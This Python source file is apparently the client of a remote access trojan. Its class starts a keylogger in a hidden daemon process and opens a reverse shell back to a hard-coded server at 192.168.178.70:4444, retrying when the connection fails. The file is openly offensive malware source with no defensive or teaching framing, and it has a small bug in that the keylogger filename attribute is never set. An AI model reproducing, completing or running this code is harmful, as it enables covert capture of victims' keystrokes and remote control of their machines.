from connection import Connection
from rev_shell import Shell
from keylogger import Keylogger
import time
import socket
import daemon
import logging


class Client:
    """
    Performs all necessary actions for the RAT to function:
        - Creates socket
        - Gets a reverse shell back to the server
    """

    def __init__(self, host: str, port: int, filename: str="activity.log") -> None:
        """
        Constructor

        :param host: The server's IP
        :param port: The server's port number
        :param filename: The file's name where the key strokes are stored
        """
        self.host = host
        self.port = port
        
        # Create client instance
        self.client = Connection(self.host, self.port)

        # Open socket connection back to server
        self.sock = self.client.connect()

        # Create shell instance
        self.shell = Shell(self.sock)
        
        # Create keylogger instance
        self.keylogger = Keylogger(self.filename)
        
        

    def hack(self) -> None:
        """
        Creates a connection between server and client.
        Starts logging key events
        Gets a reverse shell from client to server
        """
        
        # --------------------------KEYLOGGER--------------------------#
        
        # Start handler and make the proccess hidden
        with daemon.DaemonContext(files_preserve=[logging.getLogger().handlers[0].stream]):
            # Start keylogger
            self.keylogger.setup()
            self.keylogger.start_logging()
        
        # --------------------------REV SHELL--------------------------#
         
        # Get a reverse shell back to server
        try:
            self.shell.get_shell()
        except socket.error:
            time.sleep(5)  # Wait 5s
            self.sock.close()  # Close erroneous connection
            self.hack()  # Retry

        # Close connection when finished
        self.sock.close()


if __name__ == "__main__":
    # Run RAT with specified IP and port
    Client("192.168.178.70", 4444).hack()
    
